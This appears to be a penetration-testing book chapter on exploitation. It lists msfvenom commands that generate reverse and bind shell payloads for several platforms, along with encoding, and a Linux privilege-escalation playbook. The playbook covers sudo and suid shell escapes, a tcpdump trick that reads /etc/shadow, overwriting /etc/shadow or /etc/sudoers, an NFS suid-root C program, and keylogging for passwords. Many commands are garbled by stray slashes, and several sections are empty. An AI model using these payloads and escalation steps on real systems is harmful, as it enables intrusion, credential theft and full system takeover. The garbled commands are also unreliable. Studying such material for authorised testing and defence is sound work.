# Exploitation

## Searching for an Exploit

## Working with Metasploit

### Writing a Module

### Command line Interface (msfcli)

### Console (msfconsole)

### Web Interface (msfweb)

### Meterpreter Payloads (Msfvenom)

#### List payloads

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -l
A> ~~~

Or

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom --list payloads
A> ~~~

#### Generate a PHP payload

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
A> ~~~

#### Generate a Windows payload

##### Meterpreter - Reverse shell (x64):

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
A> ~~~

##### Meterpreter - Reverse shell:

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f exe > reverse.exe
A> ~~~

##### Meterpreter - Bind shell:

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p windows/meterpreter/bind_tcp RHOST=<Target_IP> LPORT=<Target_Port> -f exe > bind.exe
A> ~~~

##### CMD - Reverse shell:

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f exe > prompt.exe
A> ~~~

### Generate a Linux payload

##### Meterpreter - Reverse shell:

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f elf > reverse_bin
A> ~~~

#### Generate a Python payload

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p cmd/unix/reverse_python LHOST=<Attacker_IP> LPORT=<Attacker_port> -f raw > reverse.py
A> ~~~

#### Generate a WAR payload

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_port> -f war > payload.war
A> ~~~

### Generate an ASP payload

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_PORT> -f asp > reverse.asp
A> ~~~

#### Generate encoded payloads

##### Shikata\_ga\_nai

A> {line-numbers=on,lang=console}
A> ~~~
A> msfvenom -p <PAYLOAD> -e shikata_ga_nai -i 5 -f raw > reverse
A> ~~~


## Client Side Attacks

## Local Privilege Escalation

### Exploit in Linux

#### Privilege Escalation Techniques

##### Kernel Exploits

Check the following:

OS:

Architecture:

Kernel version:

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# uname -a
root@linux:~# cat /proc/version
root@linux:~# cat /etc/issue
A> ~~~

**Search for exploits**

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# site:exploit-db.com kernel version
A> 
A> root@linux:~# python linprivchecker.py extended
A> ~~~

Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.

##### Programs running as root

The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.

**Check which processes are running**


*Metasploit*
`ps`

*Linux*
`ps aux`


**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

A> {line-numbers=on,lang=mysql}
A> ~~~
/select sys_exec('whoami');
/select sys_eval('whoami');
A> ~~~




##### User Installed Software

Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

A> {line-numbers=on,lang=console}
A> ~~~
A> # Common locations for user installed software
A> root@linux:~# //usr/local/
A> root@linux:~# //usr/local/src
A> root@linux:~# //usr/local/bin
A> root@linux:~# //opt/
A> root@linux:~# //home
A> root@linux:~# //var/
A> root@linux:~# //usr/src/
A> 
A> # Debian
A> root@linux:~# /dpkg -l
A> 
A> # CentOS, OpenSuse, Fedora, RHEL
A> root@linux:~# /rpm -qa (CentOS / openSUSE )
A> 
A> # OpenBSD, FreeBSD
A> root@linux:~# /pkg_info
A> ~~~

##### Weak/reused/plaintext passwords


- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /username:username
root@linux:~# /username:username1
root@linux:~# /username:root
root@linux:~# /username:admin
root@linux:~# /username:qwerty
root@linux:~# /username:password
A> ~~~

- Check plaintext password

A> {line-numbers=on,lang=console}
A> ~~~
A> # Anything interesting the the mail?
A> root@linux:~# //var/spool/mail
A> ~~~

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# /./LinEnum.sh -t -k password
A> ~~~

##### Service only available from inside

It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".

Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /netstat -anlp
root@linux:~# /netstat -ano
A> ~~~

##### Suid and Guid Misconfiguration

When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.

For example, these are some programs that can be used to spawn a shell:

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /nmap
root@linux:~# /vim
root@linux:~# /less
root@linux:~# /more
A> ~~~

If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /nano
root@linux:~# /cp
root@linux:~# /mv
root@linux:~# /find
A> ~~~

**Find suid and guid files**


*Find SUID*

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /find / -perm -u=s -type f 2>/dev/null
A> ~~~

*Find GUID*

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /find / -perm -g=s -type f 2>/dev/null
A> ~~~

##### Abusing sudo-rights

If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.


`awk`

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# /awk 'BEGIN {system("/bin/bash")}'
A> ~~~

`bash`

`cp`  
Copy and overwrite /etc/shadow
   
`find`

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /sudo find / -exec bash -i \;

root@linux:~# /find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
A> ~~~
   
`ht`  

The text/binary-editor HT.

`less`

From less you can go into vi, and then into a shell.

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# /sudo less /etc/shadow
A> root@linux:~# /v
A> v:shell
A> ~~~

`more`  

You need to run more on a file that is bigger than your screen.

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# /sudo more /home/pelle/myfile
A> root@linux:~# /!/bin/bash
A> ~~~

`mv`

Overwrite `/etc/shadow` or `/etc/sudoers`

`man`

`nano`

`nc`

`nmap`


`python/perl/ruby/lua/etc`

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /sudo perl
root@linux:~# /exec "/bin/bash";
root@linux:~# /ctr-d
A> ~~~

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# /sudo python
root@linux:~# /import os
root@linux:~# /os.system("/bin/bash")
A> ~~~

`sh`

`tcpdump`

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# echo $'id\ncat /etc/shadow' > /tmp/.test
A> root@linux:~# chmod +x /tmp/.test
A> root@linux:~# sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
A> ~~~

`vi/vim`

Can be abused like this:

A> {line-numbers=off,lang=console}
A> ~~~
A> root@linux:~# sudo vi
A> root@linux:~# :shell
A> 
A> root@linux:~# :set shell=/bin/bash:shell    
A> root@linux:~# :!bash
A> ~~~


##### World writable scripts invoked as root

If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.


###### World writable files directories

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# find / -writable -type d 2>/dev/null
A> root@linux:~# find / -perm -222 -type d 2>/dev/null
A> root@linux:~# find / -perm -o w -type d 2>/dev/null
A> ~~~

###### World executable folder

A> {line-numbers=on,lang=console}
A> ~~~
A> find / -perm -o x -type d 2>/dev/null
A> ~~~

###### World writable and executable folders
A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
A> ~~~

##### Bad path configuration

Putting `.` in the path  
If you put a dot in your path you won't have to write `./binary` to be able to execute it. You will be able to execute any script or binary that is in the current directory.

Why do people/sysadmins do this? Because they are lazy and won't want to write `./.`



##### Cronjob

With privileges running script that are editable for other users.

Look for anything that is owned by privileged user but writable for you:

A> {line-numbers=on,lang=console}
A> ~~~
root@linux:~# crontab -l
root@linux:~# ls -alh /var/spool/cron
root@linux:~# ls -al /etc/ | grep cron
root@linux:~# ls -al /etc/cron*
root@linux:~# cat /etc/cron*
root@linux:~# cat /etc/at.allow
root@linux:~# cat /etc/at.deny
root@linux:~# cat /etc/cron.allow
root@linux:~# cat /etc/cron.deny
root@linux:~# cat /etc/crontab
root@linux:~# cat /etc/anacrontab
root@linux:~# cat /var/spool/cron/crontabs/root
A> ~~~

### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# mount -l
A> root@linux:~# cat /etc/fstab
A> ~~~

##### NFS Share

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.


###### First check if the target machine has any NFS shares

A> {line-numbers=on,lang=console}
A> ~~~
A> showmount -e 192.168.1.101
A> ~~~

###### If it does, then mount it to you filesystem

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# mount 192.168.1.101:/ /tmp/
A> ~~~

If that succeeds then you can go to `/tmp/share`. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:

A> {line-numbers=on,lang=console}
A> ~~~
A> root@linux:~# chmod 4777 exploit
A> ~~~

A> {line-numbers=on,lang=c}
A> ~~~
A> #include <stdio.h>
A> #include <stdlib.h>
A> #include <sys/types.h>
A> #include <unistd.h>
A> 
A> int main()
A> {
A>     setuid(0);
A>     system("/bin/bash");
A>     return 0;
A> }
A> ~~~


### Steal password through a keylogger

If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.



### Other useful stuff related to privesc

**World writable directories**

A> {line-numbers=on,lang=concsole}
A> ~~~ 
root@linux:~# /tmp
root@linux:~# /var/tmp
root@linux:~# /dev/shm
root@linux:~# /var/spool/vbox
root@linux:~# /var/spool/samba
A> ~~~











### Exploit in windows